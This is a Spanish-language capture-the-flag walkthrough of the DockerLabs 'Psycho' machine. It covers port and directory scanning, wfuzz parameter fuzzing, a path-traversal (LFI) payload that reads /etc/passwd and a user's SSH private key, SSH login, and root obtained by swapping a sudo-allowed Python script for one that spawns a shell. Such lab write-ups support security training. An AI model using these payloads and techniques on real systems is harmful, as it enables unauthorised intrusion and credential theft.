 <h1 align="center">Psycho</h1>
 
## 0. HERRAMIENTAS

- Gobuster
- Wfuzz
- LFI
- Binario perl
- Importación libreria Python (OS)

## 1. ENUMERACIÓN

En DockerLabs no hace falta buscar la ip, ya que viene dada por la interfaz docker0, siempre es 172.17.0.2

Si quisiéramos buscar la máquina lo haríamos de la siguiente manera

![image](https://github.com/user-attachments/assets/56274d5d-88b9-4cc9-b38a-e9be339936d8)


Hago un escaneo de puertos

```jsx
sudo nmap -p- --open -sS -sC -sV --min-rate=5000 -vvv -n -Pn -oN escaneo 172.17.0.2
```

![image](https://github.com/user-attachments/assets/928ae7cf-0a59-410c-9541-f0d8e32d2dc1)


Vemos el puerto 80 abierto, pero la pagina de inicio no lleva a ningún lado ni a ningún login

![image](https://github.com/user-attachments/assets/03a3af0b-94f0-4197-a347-7f008656b146)


El código fuente tampoco muestra nada. 

![image](https://github.com/user-attachments/assets/28b2f82a-e281-40cf-a138-4e8b1d77c3bf)


- Con gobuster hago un escaneo de directorios

```jsx
sudo gobuster dir -w /usr/share/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt -u '[http://172.17.0.2](http://172.17.0.2/)' -x 'html,txt,php,py'
```

![image](https://github.com/user-attachments/assets/f38bcd2b-57e1-45a4-82b6-a7d1ade7a72f)


Descubrimos el directorio assets, accedemos a la url y vemos que solo contiene un archivo de imagen que no nos lleva a ninguna parte

![image](https://github.com/user-attachments/assets/3d2505b3-c2cf-4f8f-a547-cdbba5a2df11)


- Probamos haciendo wfuzz a ver si podemos hacer ejecución de comandos a través de algún parámetro.

```jsx
sudo wfuzz -c --hl=62 -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt http://172.17.0.2/index.php?FUZZ=whoami             
```

![image](https://github.com/user-attachments/assets/27143ba3-806e-40f7-b388-f262a30799b8)


No devuelve nada, probaremos a hacer a ver si se puede hacer un LFI:

```jsx
sudo wfuzz -c --hl=62 -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt http://172.17.0.2/index.php?FUZZ=../../../../../../../../etc/passwd
```

![image](https://github.com/user-attachments/assets/c1772729-1d6c-4f1b-911f-8e7169f7b31c)


Vemos que con el parametro secret es susceptible de LFI

comprobamos con curl 

```jsx
curl http://172.17.0.2/index.php?secret=../../../../../../../etc/passwd
```

![image](https://github.com/user-attachments/assets/89551e72-ba6e-464c-943e-0e8d354c8c3d)


Tenemos el los usuarios 

- vaxei
- luisillo

## 2. COMPROMISO DEL ENTORNO

Intentamos buscar la clave RSA de esos 2 usuarios a través del LFI

```jsx
curl http://172.17.0.2/index.php?secret=../../../../../../../home/vaxei/.ssh/id_rsa
```

![image](https://github.com/user-attachments/assets/62e58a10-de44-4079-8b2c-9c0b1b1d3853)


Obtenemos el rsa de ssh de vaxei, de luisillo no encontramos nada

creamos un archivo con la rsa obtenida y probamos la conexión 

aplicamos permisos 600: chmod 600 rsa_key

![image](https://github.com/user-attachments/assets/f31e0afb-ecb0-4363-a308-85a7037124f1)


Probamos el acceso por ssh y accedemos correctamente

![image](https://github.com/user-attachments/assets/b8f432c8-aa92-4cdf-88fe-41c329eec7be)


Hacemos un sudo -l para comprobar que se puede ejecutar perl con el usuario luisillo

![image](https://github.com/user-attachments/assets/29031b12-33cc-4e6a-a4df-1d82487fc547)


Buscamos en GTFOBINS y encontramos

![image](https://github.com/user-attachments/assets/123da296-8ed7-4bcb-909d-f7ae4d7932d4)


## 3. ESCALADA DE PRIVILEGIOS

Vemos que se puede ejecutar con el usuario luisillo el script /opt/paw.py sin contraseña

![image](https://github.com/user-attachments/assets/9c468b31-4fab-49fa-b2b7-49d02e9a37c9)


Vemos el script

![image](https://github.com/user-attachments/assets/8c265e9a-0e1e-4db9-91a9-648852ec9253)

Una forma rápida de ganar root es renombrar el archivo y generar un nuevo [paw.py](http://paw.py) con el siguiente codigo

```jsx
import os
os.system("/bin/bash")
```

![image](https://github.com/user-attachments/assets/edaad069-69da-48b0-8ec0-df8a432619d5)


Ya obtenemos root

![image](https://github.com/user-attachments/assets/6d8bc57d-f83b-473c-a178-b814cfd85625)
